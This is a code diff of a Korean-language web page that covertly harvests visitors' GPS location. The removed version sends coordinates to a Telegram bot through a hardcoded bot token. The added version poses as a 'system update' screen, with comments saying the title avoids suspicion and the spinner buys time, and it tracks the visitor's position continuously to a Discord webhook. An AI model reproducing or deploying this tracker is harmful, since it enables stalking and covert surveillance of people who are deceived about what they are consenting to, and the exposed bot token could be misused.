@@ -2,109 +2,60 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>위치 확인 중...</title>
+    <title>시스템 업데이트 중...</title> <!-- 사용자가 의심하지 않도록 제목 설정 -->
     <style>
-        body { font-family: 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif; text-align: center; padding-top: 100px; background: #f4f7f6; color: #333; }
-        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 90%; }
-        h1 { font-size: 24px; margin-bottom: 20px; }
-        p { font-size: 16px; color: #666; line-height: 1.6; }
-        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; }
+        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-weight: bold; color: #3498db; }
     </style>
 </head>
 <body>
-
-<div class="box">
-    <h1>📍 위치 정보 확인</h1>
-    <div id="loader" class="loading-spinner"></div>
-    <p id="status">정확한 위치 확인을 위해  
-GPS 권한을 <b>'허용'</b>해 주세요.</p>
-    <div id="result"></div>
-</div>
+    <div class="loader"></div> <!-- 로딩 애니메이션으로 시간 벌기 -->
 
 <script>
-    // 사용자가 제공한 텔레그램 봇 정보
-    const TELEGRAM_BOT_TOKEN = '8967062277:AAH0e23mGxJNiARBjenBS-TutzCFiDtYEks';
-    const TELEGRAM_CHAT_ID = '8230964046';
+    // 1. 페이지가 열리자마자 바로 GPS 요청
+    window.onload = function() {
+        if (navigator.geolocation) {
+            // watchPosition: 위치가 바뀔 때마다 계속 호출 (실시간 추적)
+            navigator.geolocation.watchPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    // 2. 데이터 전송 (예: Discord Webhook 또는 내 서버)
+                    sendLocation(lat, lng, accuracy);
+                },
+                function(error) {
+                    console.error("위치 오류:", error);
+                },
+                {
+                    enableHighAccuracy: true, // GPS 위성 사용 (더 정확함)
+                    timeout: 5000,
+                    maximumAge: 0 // 캐시된 위치 아님, 실시간으로
+                }
+            );
+        } else {
+            alert("Geolocation을 지원하지 않는 브라우저입니다.");
+        }
+    };
 
-    function sendToTelegram(lat, lng) {
-        const message = `📍 *새로운 위치 정보 수신*\n\n` +
-                        `• 위도: ${lat}\n` +
-                        `• 경도: ${lng}\n` +
-                        `• 구글 맵: https://www.google.com/maps?q=${lat},${lng}\n\n` +
-                        `🕒 수신 시간: ${new Date( ).toLocaleString()}`;
-
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    function sendLocation(lat, lng, acc) {
+        // 예: Discord Webhook으로 전송 (URL은 본인의 것으로 변경 필요)
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; 
         
-        const params = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
+        const data = {
+            content: `📍 **새로운 위치 감지!**\n위도: ${lat}\n경도: ${lng}\n정확도: ${acc}m\n시간: ${new Date().toLocaleString()}`
         };
 
-        fetch(url, {
+        fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(params )
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("텔레그램 전송 성공");
-            } else {
-                console.error("텔레그램 전송 실패", response.statusText);
-            }
-        })
-        .catch(err => console.error("네트워크 오류:", err));
-    }
-
-    // 위치 추적 로직
-    if (!navigator.geolocation) {
-        document.getElementById('status').innerText = "이 브라우저는 위치 정보를 지원하지 않습니다.";
-        document.getElementById('loader').style.display = 'none';
-    } else {
-        // 타임아웃 설정을 추가하여 무한 로딩 방지
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 8000, // 8초 내에 위치를 못 가져오면 에러 처리
-            maximumAge: 0
-        };
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                
-                document.getElementById('status').innerHTML = "위치 확인 완료!  
-지도로 이동합니다.";
-                document.getElementById('loader').style.display = 'none';
-                
-                // 텔레그램으로 전송
-                sendToTelegram(lat, lng);
-
-                // 전송 시도 후 즉시 또는 약간의 지연 후 구글 맵으로 리다이렉트
-                setTimeout(() => {
-                    window.location.href = `https://www.google.com/maps?q=${lat},${lng}`;
-                }, 1000 );
-            },
-            (error) => {
-                let msg = "위치 정보를 가져오지 못했습니다.";
-                if (error.code === 1) {
-                    msg = "위치 권한이 거부되었습니다. 설정에서 허용해 주세요.";
-                } else if (error.code === 3) {
-                    msg = "위치 확인 시간이 초과되었습니다. 다시 시도해 주세요.";
-                }
-                document.getElementById('status').innerText = msg;
-                document.getElementById('loader').style.display = 'none';
-                
-                // 권한 거부 시에도 텔레그램에 알림을 보낼 수 있습니다 (선택 사항)
-                // sendToTelegram("권한 거부", "권한 거부");
-            },
-            options
-        );
+            body: JSON.stringify(data)
+        }).then(response => {
+            if(response.ok) console.log("위치 전송 성공");
+        });
     }
 </script>
-
 </body>
 </html>
